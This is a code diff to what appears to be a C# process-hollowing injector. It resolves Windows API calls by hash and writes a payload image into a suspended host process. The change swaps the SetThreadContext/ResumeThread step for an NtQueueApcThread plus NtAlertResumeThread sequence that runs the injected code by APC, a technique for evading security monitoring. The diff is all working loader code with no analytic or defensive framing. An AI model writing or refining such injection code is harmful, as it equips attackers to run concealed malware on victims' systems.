@@ -614,6 +614,33 @@ namespace A
 
         #endregion
 
+        #region NtQueueApcThread
+
+        #region Definition
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
+        private delegate int t_NtQueueApcThread(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData, IntPtr opt2, IntPtr opt3);
+
+        #endregion
+
+        private static t_NtQueueApcThread NtQueueApcThread;
+
+        #endregion
+
+        #region NtAlertResumeThread
+
+        #region Definition
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
+        private delegate int t_NtAlertResumeThread(IntPtr ThreadHandle, ref ulong SuspendCount);
+
+        #endregion
+
+        private static t_NtAlertResumeThread NtAlertResumeThread;
+
+        #endregion
+
+
         private static T LoadFunction<T>(IntPtr lpModuleBase, uint dwFunctionHash)
         {
             IntPtr lpFunction = GetProcAddress(lpModuleBase, dwFunctionHash);
@@ -639,8 +666,12 @@ namespace A
             WriteProcessMemory = LoadFunction<t_WriteProcessMemory>(lpKernel32, FNVHash("WriteProcessMemory"));
             SetThreadContext = LoadFunction<t_SetThreadContext>(lpKernel32, FNVHash("SetThreadContext"));
             ResumeThread = LoadFunction<t_ResumeThread>(lpKernel32, FNVHash("ResumeThread"));
+
+            // ntdll functions
+            NtQueueApcThread = LoadFunction<t_NtQueueApcThread>(lpNtdll, FNVHash("NtQueueApcThread"));
+            NtAlertResumeThread = LoadFunction<t_NtAlertResumeThread>(lpNtdll, FNVHash("NtAlertResumeThread"));
         }
-            
+
         private struct HostProcessInfo
         {
             public STARTUPINFO SI;
@@ -879,12 +910,16 @@ namespace A
             else
                 HPI.CTX.Eax = (uint)v + pINH.OptionalHeader.AddressOfEntryPoint;
 
-            bResult = SetThreadContext(HPI.PI.hThread, ref HPI.CTX);
+            //bResult = SetThreadContext(HPI.PI.hThread, ref HPI.CTX);
 
-            if (!bResult)
-                return false;
+            //if (!bResult)
+            //    return false;
 
-            ResumeThread(HPI.PI.hThread);
+            //ResumeThread(HPI.PI.hThread);
+
+            ulong suspend = 0;
+            NtQueueApcThread(HPI.PI.hThread, (IntPtr)HPI.CTX.Eax, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
+            NtAlertResumeThread(HPI.PI.hThread, ref suspend);
 
             return bResult;
         }
